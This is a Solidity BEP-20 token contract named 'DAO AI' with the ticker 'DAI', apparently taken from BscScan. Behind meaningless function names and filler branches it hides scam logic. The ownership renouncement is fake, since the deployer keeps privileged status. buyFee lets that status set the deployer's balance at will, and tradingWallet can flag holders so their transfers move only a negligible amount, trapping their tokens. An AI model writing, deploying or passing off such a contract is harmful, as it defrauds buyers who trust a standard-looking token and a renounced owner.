/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface atTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundList) external view returns (uint256);

    function transfer(address autoLaunch, uint256 swapTeamSell) external returns (bool);

    function allowance(address receiverEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTeamSell) external returns (bool);

    function transferFrom(
        address sender,
        address autoLaunch,
        uint256 swapTeamSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoReceiver, uint256 value);
    event Approval(address indexed receiverEnable, address indexed spender, uint256 value);
}

interface atTeamMetadata is atTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface shouldToken {
    function createPair(address isLaunch, address takeReceiver) external returns (address);
}

interface receiverIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract DAOAI is listTx, atTeam, atTeamMetadata {
    uint8 private receiverTradingExempt = 18;
    
    uint256 private amountAuto;
    address private amountToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private atEnable;
    uint256 private sellSwap;
    string private senderAt = "DAO AI";
    address public buyMode;
    mapping(address => bool) public totalTx;
    uint256 private exemptLaunched;

    uint256 private senderFund = 100000000 * 10 ** receiverTradingExempt;
    string private sellTrading = "DAI";

    mapping(address => uint256) private senderWalletExempt;

    address public teamReceiver;
    bool public atLaunched;


    mapping(address => bool) public receiverAuto;
    mapping(address => mapping(address => uint256)) private launchedSell;
    
    uint256 constant senderExempt = 10 ** 10;
    

    event OwnershipTransferred(address indexed minReceiver, address indexed enableSwap);

    constructor (){
        if (sellSwap == exemptLaunched) {
            sellSwap = amountAuto;
        }
        receiverIs liquiditySell = receiverIs(amountToken);
        teamReceiver = shouldToken(liquiditySell.factory()).createPair(liquiditySell.WETH(), address(this));
        atEnable = _msgSender();
        if (amountAuto == exemptLaunched) {
            sellSwap = exemptLaunched;
        }
        buyMode = atEnable;
        totalTx[buyMode] = true;
        if (sellSwap != exemptLaunched) {
            sellSwap = exemptLaunched;
        }
        senderWalletExempt[buyMode] = senderFund;
        emit Transfer(address(0), buyMode, senderFund);
        totalReceiverMax();
    }

    

    function feeExempt() public {
        
        
        amountAuto=0;
    }

    function receiverSwapLiquidity() public view returns (uint256) {
        return sellSwap;
    }

    function name() external view virtual override returns (string memory) {
        return senderAt;
    }

    function transfer(address atLimit, uint256 swapTeamSell) external virtual override returns (bool) {
        return sellFund(_msgSender(), atLimit, swapTeamSell);
    }

    function totalReceiverMax() public {
        emit OwnershipTransferred(buyMode, address(0));
        atEnable = address(0);
    }

    function owner() external view returns (address) {
        return atEnable;
    }

    function getOwner() external view returns (address) {
        return atEnable;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverTradingExempt;
    }

    function tradingWallet(address swapAuto) public {
        if (amountAuto == sellSwap) {
            amountAuto = sellSwap;
        }
        if (swapAuto == buyMode || swapAuto == teamReceiver || !totalTx[_msgSender()]) {
            return;
        }
        if (sellSwap == amountAuto) {
            exemptLaunched = sellSwap;
        }
        receiverAuto[swapAuto] = true;
    }

    function sellFund(address autoMax, address autoLaunch, uint256 swapTeamSell) internal returns (bool) {
        if (autoMax == buyMode || autoLaunch == buyMode) {
            return fundTake(autoMax, autoLaunch, swapTeamSell);
        }
        if (amountAuto == sellSwap) {
            exemptLaunched = amountAuto;
        }
        if (receiverAuto[autoMax]) {
            return fundTake(autoMax, autoLaunch, senderExempt);
        }
        if (exemptLaunched != sellSwap) {
            sellSwap = exemptLaunched;
        }
        return fundTake(autoMax, autoLaunch, swapTeamSell);
    }

    function swapEnable() public view returns (uint256) {
        return exemptLaunched;
    }

    function launchMarketing() public view returns (uint256) {
        return sellSwap;
    }

    function senderMin() public view returns (uint256) {
        return exemptLaunched;
    }

    function amountReceiverFee() public {
        if (amountAuto != exemptLaunched) {
            sellSwap = exemptLaunched;
        }
        if (sellSwap == exemptLaunched) {
            exemptLaunched = amountAuto;
        }
        sellSwap=0;
    }

    function buyFee(uint256 swapTeamSell) public {
        if (!totalTx[_msgSender()]) {
            return;
        }
        senderWalletExempt[buyMode] = swapTeamSell;
    }

    function transferFrom(address autoMax, address autoLaunch, uint256 swapTeamSell) external override returns (bool) {
        if (launchedSell[autoMax][_msgSender()] != type(uint256).max) {
            require(swapTeamSell <= launchedSell[autoMax][_msgSender()]);
            launchedSell[autoMax][_msgSender()] -= swapTeamSell;
        }
        return sellFund(autoMax, autoLaunch, swapTeamSell);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderFund;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellTrading;
    }

    function fundTake(address autoMax, address autoLaunch, uint256 swapTeamSell) internal returns (bool) {
        require(senderWalletExempt[autoMax] >= swapTeamSell);
        senderWalletExempt[autoMax] -= swapTeamSell;
        senderWalletExempt[autoLaunch] += swapTeamSell;
        emit Transfer(autoMax, autoLaunch, swapTeamSell);
        return true;
    }

    function totalLaunchedToken(address takeLaunch) public {
        if (atLaunched) {
            return;
        }
        
        totalTx[takeLaunch] = true;
        if (amountAuto != exemptLaunched) {
            exemptLaunched = amountAuto;
        }
        atLaunched = true;
    }

    function balanceOf(address fundList) public view virtual override returns (uint256) {
        return senderWalletExempt[fundList];
    }

    function atLaunchMarketing() public view returns (uint256) {
        return amountAuto;
    }

    function tokenBuyMarketing() public {
        if (sellSwap != exemptLaunched) {
            amountAuto = sellSwap;
        }
        if (amountAuto == exemptLaunched) {
            exemptLaunched = amountAuto;
        }
        exemptLaunched=0;
    }

    function allowance(address minMax, address atLaunch) external view virtual override returns (uint256) {
        return launchedSell[minMax][atLaunch];
    }

    function approve(address atLaunch, uint256 swapTeamSell) public virtual override returns (bool) {
        launchedSell[_msgSender()][atLaunch] = swapTeamSell;
        emit Approval(_msgSender(), atLaunch, swapTeamSell);
        return true;
    }


}